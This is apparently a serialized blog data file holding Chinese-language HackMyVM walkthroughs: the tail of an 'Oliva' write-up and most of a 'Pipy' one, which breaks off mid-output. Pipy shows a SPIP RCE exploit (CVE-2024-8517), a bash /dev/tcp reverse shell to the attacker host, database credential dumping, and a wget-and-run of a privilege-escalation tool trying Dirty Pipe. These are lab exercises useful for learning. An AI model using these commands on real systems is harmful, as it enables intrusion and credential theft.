7\u6708 4\u65e5 mypass.txt\n```\n\n\u67e5\u770b `mypass.txt` \u5185\u5bb9\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt]\n\u2514\u2500$ cat mypass.txt\nYesthatsmypass!\n```\n\n# 3. \u767b\u5f55 SSH\n\n\u4f7f\u7528\u6587\u4ef6\u4e2d\u627e\u5230\u7684\u5bc6\u7801 `Yesthatsmypass!` \u767b\u5f55 SSH\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt]\n\u2514\u2500$ ssh oliva@192.168.205.138\noliva@192.168.205.138's password: Yesthatsmypass!\noliva@oliva:~$ id\nuid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)\n```\n\n# 4. \u63d0\u6743\n\n\u67e5\u770b `sudo` \u914d\u7f6e\uff1a\n\n```bash\noliva@oliva:~$ sudo -l\n-bash: sudo: orden no encontrada\n```\n\n`sudo` \u672a\u5b89\u88c5\uff0c\u68c0\u67e5\u7cfb\u7edf\u6743\u9650\uff1a\n\n```bash\noliva@oliva:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n```\n\n\u4f7f\u7528 `getcap` \u67e5\u770b\u6743\u9650\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/nmap cap_dac_read_search=eip\n/usr/bin/ping cap_net_raw=ep\n```\n\n\u67e5\u770b `/var/www/html/` \u76ee\u5f55\uff0c\u4f7f\u7528`nmap`\u770b\u6709\u6ca1\u6709\u4ec0\u4e48\u9690\u85cf\u4fe1\u606f\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cd /var/www/html/\n\u2514\u2500$ ls -la\ntotal 19548\ndrwxr-xr-x 2 root     root         4096 jul  4  2023 .\ndrwxr-xr-x 3 root     root         4096 jul  4  2023 ..\n-rw-rw---- 1 www-data www-data      615 jul  4  2023 index.html\n-rw-rw---- 1 www-data www-data      163 jul  4  2023 index.php\n-rw-rw---- 1 www-data www-data 20000000 jul  4  2023 oliva\noliva@oliva:/var/www/html$ nmap -iL index.php \nStarting Nmap 7.93 ( https://nmap.org ) at 2025-01-22 03:34 CET\nFailed to resolve 'Hi'.\nFailed to resolve 'oliva,'.\nFailed to resolve 'Here'.\nFailed to resolve 'the'.\nFailed to resolve 'pass'.\nFailed to resolve 'to'.\nFailed to resolve 'obtain'.\nFailed to resolve 'root:'.\nFailed to resolve '<?php'.\nFailed to resolve '$dbname'.\nFailed to resolve '='.\nFailed to resolve ''easy';'.\nFailed to resolve '$dbuser'.\nFailed to resolve '='.\nFailed to resolve ''root';'.\nFailed to resolve '$dbpass'.\nFailed to resolve '='.\nFailed to resolve ''Savingmypass';'.\nFailed to resolve '$dbhost'.\nFailed to resolve '='.\nFailed to resolve ''localhost';'.\nFailed to resolve '?>'.\nFailed to resolve '<a'.\nUnable to split netmask from target expression: 'href='oliva'>CLICK!</a>'\nWARNING: No targets were specified, so 0 hosts scanned.\nNmap done: 0 IP addresses (0 hosts up) scanned in 65.35 seconds\n```\n\n\u901a\u8fc7\u67e5\u770b `index.php` \u4e2d\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6570\u636e\u5e93\u767b\u5f55\u4fe1\u606f\uff0c\u5e76\u767b\u5f55 MariaDB \u6570\u636e\u5e93\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ mysql -u root -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 5\nServer version: 10.11.3-MariaDB-1 Debian 12\n```\n\n\u67e5\u770b\u6570\u636e\u5e93 `easy`\uff1a\n\n```bash\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| easy               |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n\nMariaDB [(none)]> use easy;\nMariaDB [easy]> show tables;\n+----------------+\n| Tables_in_easy |\n+----------------+\n| logging        |\n+----------------+\n```\n\n\u67e5\u770b `logging` \u8868\uff1a\n\n```bash\nMariaDB [easy]> select * from logging;\n+--------+------+--------------+\n| id_log | uzer | pazz         |\n+--------+------+--------------+\n|      1 | root | OhItwasEasy! |\n+--------+------+--------------+\n```\n\n\u4f7f\u7528\u5bc6\u7801 `OhItwasEasy!` \u767b\u5f55 root \u7528\u6237\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ su -\nContrase\u00f1a: OhItwasEasy!\nroot@oliva:~# id\nuid=0(root) gid=0(root) grupos=0(root)\n```\n\n\u6210\u529f\u63d0\u6743\uff0c\u83b7\u53d6 root \u6743\u9650\u3002\n\n# 5.\u6536\u5c3e\n\n```bash\n# \u5378\u8f7d\u52a0\u5bc6\u8bbe\u5907\nsudo umount /mnt\n\n# \u5173\u95ed LUKS \u52a0\u5bc6\u8bbe\u5907\nsudo cryptsetup luksClose oliva\n\n# \u67e5\u770b\u8bbe\u5907\u662f\u5426\u5df2\u7ecf\u5173\u95ed\nlsblk\n\n# \u68c0\u67e5\u662f\u5426\u4ecd\u7136\u6302\u8f7d\nmount | grep /dev/mapper\n```sentence", "top": 0, "createdAt": 1751016806, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P110": {"htmlDir": "docs/post/hmv_Pipy.html", "labels": ["HackMyVM"], "postTitle": "hmv_Pipy", "postUrl": "post/hmv_Pipy.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/110", "commentNum": 0, "wordCount": 21043, "description": "# hmv_Pipy\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Pipy](https://hackmyvm.eu/machines/machine.php?vm=Pipy)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.143\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 10:33 CST\nNmap scan report for tiny.hmv (192.168.205.143)\nHost is up (0.00031s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:47:C9:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.43 seconds\n```\n\n\u5148\u770b**80\u7aef\u53e3**\uff0c**22\u7aef\u53e3**\u5019\u8865\n\n# 2.\u8e29\u70b9\n\n![Image](https://github.com/user-attachments/assets/864afc4f-50bc-4481-9a21-60be11e82b62)\n\n\u626b\u63cf\u6709\u6ca1\u6709\u6f0f\u6d1e\uff08\u4e0d\u5f97\u4e0d\u8bf4\uff0c\u7fa4\u91cc\u9762\u7684web\u5927\u4f6c**Anjv-W.**  \u63a8\u8350\u7684\u626b\u6d1e\u5de5\u5177\u5c31\u662f\u597d\u7528\uff0c\u70b9\u8d5e\ud83d\udc4d\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nuclei -u http://192.168.205.143               \n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.3.8\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.3.8 (latest)\n[INF] Current nuclei-templates version: v10.1.1 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 154\n[INF] Templates loaded for current scan: 7607\n[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates\n[WRN] Loading 182 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1702 (Reduced 1602 Requests)\n[INF] Using Interactsh Server: oast.online\n[CVE-2024-8517] [http] [critical] http://192.168.205.143/spip.ph%70?pag%65=spip_pass&lang=fr\n[waf-detect:apachegeneric] [http] [info] http://192.168.205.143\n[openssh-detect] [tcp] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']\n[ssh-password-auth] [javascript] [info] 192.168.205.143:22\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.143:22\n[ssh-server-enumeration] [javascript] [info] 192.168.205.143:22 ['SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4']\n[ssh-auth-methods] [javascript] [info] 192.168.205.143:22 ['['publickey','password']']\n[CVE-2023-48795] [javascript] [medium] 192.168.205.143:22 ['Vulnerable to Terrapin']\n[composer-config:composer.json] [http] [info] http://192.168.205.143/composer.json\n[composer-config:composer.json] [http] [info] http://192.168.205.143/vendor/composer/installed.json\n[metatag-cms] [http] [info] http://192.168.205.143 ['SPIP 4.2.0']\n[readme-md] [http] [info] http://192.168.205.143/README.md\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.143\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.143\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.143\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.143\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.143\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.143\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.143\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.143\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.143\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.143\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.143\n[apache-detect] [http] [info] http://192.168.205.143 ['Apache/2.4.52 (Ubuntu)']\n[spip-detect:spip_version] [http] [info] http://192.168.205.143 ['4.2.0']\n[configuration-listing] [http] [medium] http://192.168.205.143/config/\n```\n\n\u6709\u4e00\u4e2a[CVE-2024-8517](https://github.com/Chocapikk/CVE-2024-8517)\u6f0f\u6d1e\uff0c\u6211\u4eec\u5229\u7528\u4e00\u4e0b\n\n![Image](https://github.com/user-attachments/assets/7cd77edc-68bf-4898-847d-19a65f300d12)\n\n\u975e\u6388\u6743\u8fdc\u7a0b\u6267\u884c\u66f4\u559c\u6b22\u4e86\ud83e\udd29\n\n```bash\ngit clone https://github.com/Chocapikk/CVE-2024-8517.git\ncd CVE-2024-8517\npython3 -m venv env\nsource env/bin/activate\npip install -r requirements.txt \n\u250c\u2500\u2500(env)\u2500(kali\u327fkali)-[~/test/tmp/CVE-2024-8517]\n\u2514\u2500$ python3 exploit.py -u http://192.168.205.143          \n\u2705 Target is vulnerable! Command Output: www-data\n                                                                                                                                     \n\u2139  Interactive shell started. Type `exit` to quit.\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\ndeactivate #\u9000\u51fa\u865a\u62df\u73af\u5883\u547d\u4ee4\nrm -rf env #\u5220\u9664\u865a\u62df\u73af\u5883\n```\n\n\u6210\u529f\uff0c\u4f46\u662f\u6211\u4eec\u8981\u5f39\u4e2a**\u53cd\u5f39shell**\u56de\u53bb\uff0c\u56e0\u4e3a\u5b83\u8fd9\u4e2a\u811a\u672c\u7684shell\u6709\u9650\u5236\n\n```bash\n$ bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@pipy:/var/www/html$ sudo -l\n[sudo] password for www-data: \nsudo: a password is required\nwww-data@pipy:/var/www/html$ ls -la\ntotal 156\ndrwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 .\ndrwxr-xr-x  4 www-data www-data  4096 Oct  5  2023 ..\n-rw-r--r--  1 www-data www-data  7045 Feb 23  2023 CHANGELOG.md\ndrwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 IMG\n-rw-r--r--  1 www-data www-data 35147 Feb 23  2023 LICENSE\n-rw-r--r--  1 www-data www-data   842 Feb 23  2023 README.md\n-rw-r--r--  1 www-data www-data   178 Feb 23  2023 SECURITY.md\n-rw-r--r--  1 www-data www-data  1761 Feb 23  2023 composer.json\n-rw-r--r--  1 www-data www-data 27346 Feb 23  2023 composer.lock\ndrwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 config\ndrwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 ecrire\n-rw-r--r--  1 www-data www-data  4307 Feb 23  2023 htaccess.txt\n-rw-r--r--  1 www-data www-data    42 Feb 23  2023 index.php\ndrwxr-xr-x  5 www-data www-data  4096 Oct  3  2023 local\ndrwxr-xr-x 22 www-data www-data  4096 Oct  3  2023 plugins-dist\n-rw-r--r--  1 www-data www-data  3645 Feb 23  2023 plugins-dist.json\ndrwxr-xr-x 12 www-data www-data  4096 Oct  3  2023 prive\n-rw-r--r--  1 www-data www-data   973 Feb 23  2023 spip.php\n-rw-r--r--  1 www-data www-data  1212 Feb 23  2023 spip.png\n-rw-r--r--  1 www-data www-data  1673 Feb 23  2023 spip.svg\ndrwxr-xr-x 10 www-data www-data  4096 Oct  3  2023 squelettes-dist\ndrwxr-xr-x  5 www-data www-data  4096 Jan 18 02:35 tmp\ndrwxr-xr-x  6 www-data www-data  4096 Oct  3  2023 vendor\nwww-data@pipy:/var/www/html$ cd config/\nwww-data@pipy:/var/www/html/config$ ls -al\ntotal 48\ndrwxr-xr-x  2 www-data www-data  4096 Oct  3  2023 .\ndrwxr-xr-x 11 www-data www-data  4096 Oct  4  2023 ..\n-rw-rw-rw-  1 www-data www-data   197 Oct  3  2023 .htaccess\n-rw-rw-rw-  1 www-data www-data     0 Oct  3  2023 .ok\n-rw-rw-rw-  1 www-data www-data   109 Oct  3  2023 chmod.php\n-rw-rw-rw-  1 www-data www-data   163 Oct  3  2023 cles.php\n-rw-rw-rw-  1 www-data www-data   243 Oct  3  2023 connect.php\n-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php\n-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt\nwww-data@pipy:/var/www/html/config$ cat connect.php\n<?php\nif (!defined('_ECRIRE_INC_VERSION')) return;\ndefined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);\n$GLOBALS['spip_connect_version'] = 0.8;\nspip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');\nwww-data@pipy:/var/www/html/config$ mysql -u root -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 503\nServer version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> use spip;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [spip]> show tables;\n+-------------------------+\n| Tables_in_spip          |\n+-------------------------+\n| spip_articles           |\n| spip_auteurs            |\n| spip_auteurs_liens      |\n| spip_depots             |\n| spip_depots_plugins     |\n| spip_documents          |\n| spip_documents_liens    |\n| spip_forum              |\n| spip_groupes_mots       |\n| spip_jobs               |\n| spip_jobs_liens         |\n| spip_meta               |\n| spip_mots               |\n| spip_mots_liens         |\n| spip_paquets            |\n| spip_plugins            |\n| spip_referers           |\n| spip_referers_articles  |\n| spip_resultats          |\n| spip_rubriques          |\n| spip_syndic             |\n| spip_syndic_articles    |\n| spip_types_documents    |\n| spip_urls               |\n| spip_versions           |\n| spip_versions_fragments |\n| spip_visites            |\n| spip_visites_articles   |\n+-------------------------+\n28 rows in set (0.000 sec)\n\nMariaDB [spip]> select * from spip_auteurs\\G\n*************************** 1. row ***************************\n   id_auteur: 1\n         nom: Angela\n         bio: \n       email: angela@pipy.htb\n    nom_site: \n    url_site: \n       login: angela\n        pass: 4ng3l4\n     low_sec: \n      statut: 0minirezo\n   webmestre: oui\n         maj: 2023-10-04 17:28:39\n         pgp: \n      htpass: \n    en_ligne: 2023-10-04 13:50:34\n alea_actuel: 387046876651c39a45bc836.13502903\n  alea_futur: 465278670651d6da4349d85.01841245\n       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}\ncookie_oubli: NULL\n      source: spip\n        lang: \n    imessage: \n backup_cles: 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM=\n*************************** 2. row ***************************\n   id_auteur: 2\n         nom: admin\n         bio: \n       email: admin@pipy.htb\n    nom_site: \n    url_site: \n       login: admin\n        pass: $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2\n     low_sec: \n      statut: 1comite\n   webmestre: non\n         maj: 2023-10-04 17:31:03\n         pgp: \n      htpass: \n    en_ligne: 2023-10-04 17:31:03\n alea_actuel: 1540227024651d7e881c21a5.84797952\n  alea_futur: 439334464651da1526dbb90.67439545\n       prefs: a:4:{s:7:'couleur';i:2;s:7:'display';i:2;s:18:'display_navigation';s:22:'navigation_avec_icones';s:3:'cnx';s:0:'';}\ncookie_oubli: 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o=\n      source: spip\n        lang: fr\n    imessage: oui\n backup_cles: \n2 rows in set (0.000 sec)\n```\n\n\u5207\u6362\u81f3`angela`\n\n```bash\nwww-data@pipy:/var/www/html/config$ su - angela\nPassword: \nangela@pipy:~$ id\nuid=1000(angela) gid=1000(angela) groups=1000(angela)\n```\n\n\u7ee7\u7eed\u63d0\u6743\n\n```bash\nangela@pipy:~$ ls -la\ntotal 40\ndrwxr-x--- 6 angela angela 4096 Oct 17  2023 .\ndrwxr-xr-x 3 root   root   4096 Oct  4  2023 ..\nlrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc\ndrwx------ 3 angela angela 4096 Oct  5  2023 .cache\ndrwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local\n-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile\ndrwx------ 3 angela angela 4096 Oct  3  2023 snap\ndrwx------ 2 angela angela 4096 Oct  2  2023 .ssh\n-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful\n-rw------- 1 angela angela   33 Oct  5  2023 user.txt\nangela@pipy:~$ cd /opt/\nangela@pipy:/opt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Aug 10  2023 .\ndrwxr-xr-x 19 root root 4096 Oct  2  2023 ..\nangela@pipy:/opt$ cd /tmp/\nangela@pipy:/tmp$ ls -al\ntotal 12\ndrwxrwxrwt  2 root     root     4096 Jan 18 02:44 .\ndrwxr-xr-x 19 root     root     4096 Oct  2  2023 ..\n-rw-------  1 www-data www-data   19 Jan 18 02:44 phpMHrr6q\nangela@pipy:/tmp$ cd /mnt/\nangela@pipy:/mnt$ ls -la\ntotal 8\ndrwxr-xr-x  2 root root 4096 Aug 10  2023 .\ndrwxr-xr-x 19 root root 4096 Oct  2  2023 ..\nangela@pipy:/mnt$ find / -perm -4000 -type f 2>/dev/null\n/usr/libexec/polkit-agent-helper-1\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/fusermount3\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/su\n/usr/bin/pkexec\n/snap/snapd/23545/usr/lib/snapd/snap-confine\n/snap/snapd/20092/usr/lib/snapd/snap-confine\n/snap/core20/2434/usr/bin/chfn\n/snap/core20/2434/usr/bin/chsh\n/snap/core20/2434/usr/bin/gpasswd\n/snap/core20/2434/usr/bin/mount\n/snap/core20/2434/usr/bin/newgrp\n/snap/core20/2434/usr/bin/passwd\n/snap/core20/2434/usr/bin/su\n/snap/core20/2434/usr/bin/sudo\n/snap/core20/2434/usr/bin/umount\n/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/2434/usr/lib/openssh/ssh-keysign\n/snap/core20/2015/usr/bin/chfn\n/snap/core20/2015/usr/bin/chsh\n/snap/core20/2015/usr/bin/gpasswd\n/snap/core20/2015/usr/bin/mount\n/snap/core20/2015/usr/bin/newgrp\n/snap/core20/2015/usr/bin/passwd\n/snap/core20/2015/usr/bin/su\n/snap/core20/2015/usr/bin/sudo\n/snap/core20/2015/usr/bin/umount\n/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/2015/usr/lib/openssh/ssh-keysign\n/snap/core/17200/bin/mount\n/snap/core/17200/bin/ping\n/snap/core/17200/bin/ping6\n/snap/core/17200/bin/su\n/snap/core/17200/bin/umount\n/snap/core/17200/usr/bin/chfn\n/snap/core/17200/usr/bin/chsh\n/snap/core/17200/usr/bin/gpasswd\n/snap/core/17200/usr/bin/newgrp\n/snap/core/17200/usr/bin/passwd\n/snap/core/17200/usr/bin/sudo\n/snap/core/17200/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/17200/usr/lib/openssh/ssh-keysign\n/snap/core/17200/usr/lib/snapd/snap-confine\n/snap/core/17200/usr/sbin/pppd\n/snap/core/16202/bin/mount\n/snap/core/16202/bin/ping\n/snap/core/16202/bin/ping6\n/snap/core/16202/bin/su\n/snap/core/16202/bin/umount\n/snap/core/16202/usr/bin/chfn\n/snap/core/16202/usr/bin/chsh\n/snap/core/16202/usr/bin/gpasswd\n/snap/core/16202/usr/bin/newgrp\n/snap/core/16202/usr/bin/passwd\n/snap/core/16202/usr/bin/sudo\n/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/16202/usr/lib/openssh/ssh-keysign\n/snap/core/16202/usr/lib/snapd/snap-confine\n/snap/core/16202/usr/sbin/pppd\nangela@pipy:/mnt$ /sbin/getcap -r / 2>/dev/null\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/mtr-packet cap_net_raw=ep\n/usr/bin/ping cap_net_raw=ep\n/snap/core20/2434/usr/bin/ping cap_net_raw=ep\n/snap/core20/2015/usr/bin/ping cap_net_raw=ep\nangela@pipy:/mnt$ ss -tuln | grep tcp\ntcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        \ntcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        \ntcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        \ntcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        \ntcp   LISTEN 0      511                         *:80              *:*        \ntcp   LISTEN 0      128                      [::]:22           [::]:*        \nangela@pipy:/mnt$ nc\nnc          nc.openbsd  \nangela@pipy:/mnt$ nc 127.0.0.1 4226\na\nhello\nroot\nangela@pipy:/mnt$ ls\nangela@pipy:/mnt$ nc 127.0.0.1 4226\nroot\nadmin\n```\n\n\u4ec0\u4e48\u90fd\u6ca1\u627e\u5230,\u8fd8\u6ca1\u5b9a\u65f6\u4efb\u52a1\uff0c\u4e0d\u4f1a\u662f**\u5185\u6838\u63d0\u6743**\u5427\uff0c\u5c1d\u8bd5\u4e00\u4e0b\u53ef\u4e0d\u53ef\u4ee5\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u63d0\u6743\n\n```bash\nangela@pipy:/mnt$ cd /tmp/\nangela@pipy:/tmp$ wget 192.168.205.141/traitor-386\n--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386\nConnecting to 192.168.205.141:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 8475976 (8.1M) [application/octet-stream]\nSaving to: \u2018traitor-386\u2019\n\ntraitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================>]   8.08M  --.-KB/s    in 0.03s   \n\n2025-01-18 02:52:07 (282 MB/s) - \u2018traitor-386\u2019 saved [8475976/8475976]\n\nangela@pipy:/tmp$ chmod +x traitor-386 \nangela@pipy:/tmp$ ./traitor-386 -a\n\n                                                                                                                                     \n\u2580\u2588\u2580\u2003\u2588\u2580\u2588\u2003\u2584\u2580\u2588\u2003\u2588\u2003\u2580\u2588\u2580\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2588                                                                                                            \n\u2591\u2588\u2591\u2003\u2588\u2580\u2584\u2003\u2588\u2580\u2588\u2003\u2588\u2003\u2591\u2588\u2591\u2003\u2588\u2584\u2588\u2003\u2588\u2580\u2584 v0.0.14                                                                                                    \nhttps://github.com/liamg/traitor                                                                                                     \n                                                                                                                                     \n[+] Assessing machine state...                                                                                                       \n[+] Checking for opportunities...\n[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!\n[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...\n[+][kernel:CVE-2022-0847] Attempting to set root password...\n[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...\n[+][kernel:CVE-2022-0847] Creating pipe...\n[+][kernel:CVE-2022-0847] Determining pipe size...\n[+][kernel:CVE-2022-0847] Pipe size is 65536.\n[+][kernel:CVE-2022-0847] Filling pipe...\n[+][kernel:CVE-2022-0847] Draining pipe...\n[+][kernel:CVE-2022-0847] Pipe drained.\n[+][kernel:CVE-2022-0847] Splicing data...\n[+][kernel:CVE-2022-0847] Writing to dirty pipe...\n[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!\n[+][kernel:CVE-2022-0847] Starting shell...\n[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.\n[+][kernel:CVE-2022-0847] Setting up tty...\n[+][kernel:CVE-2022-0847] Attempting authentication as root...\n[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...\n[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...\n[+][kernel:CVE-2022-0847] Creating pipe...\n[+][kernel:CVE-2022-0847] Determining pipe size...\n[+][kernel:CVE-2022-0847] Pipe size is 65536.\n[+][kernel:CVE-2022-0847] Filling pipe...\n[+][kernel:CVE-2022-0847] Draining pipe...\n[+][kernel:CVE-2022-0847] Pipe drained.\n[+][kernel:CVE-2022-0847] Splicing data...\n[+][kernel:CVE-2022-0847] Writing to dirty pipe...\n[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!\n[+][error] Exploit failed: invalid password\n[+] Continuing to look for opportunities\n[+] Nothing found to exploit.\n```\n\n\u4e0d\u53ef\u4ee5\uff0c\u90a3\u8fd8\u662f\u6211\u4eec\u81ea\u5df1\u627e\u5427\n\n```bash\nangela@pipy:/tmp$ uname -a\nLinux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\nangela@pipy:/tmp$ lsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 22.04.3 LTS\nRelease:        22.04\nCodename:       